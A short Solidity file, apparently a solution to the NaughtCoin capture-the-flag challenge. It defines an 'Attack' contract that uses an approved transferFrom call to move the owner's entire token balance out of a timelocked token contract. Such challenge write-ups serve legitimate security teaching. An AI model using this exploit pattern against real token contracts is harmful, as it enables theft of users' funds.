pragma solidity ^0.6.0;
// requires that the owner has approved this contract to use transferfrom
interface NaughtCoin {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address _to, uint256 _value) external;
}

contract Attack {
    address owner;
    address vic;
    constructor(address _vic) public {
        owner = msg.sender;
        vic = _vic;
    }

    function attack() external {
        NaughtCoin(vic).transferFrom(owner, address(this), 1000000000000000000000000);
        
    }
}
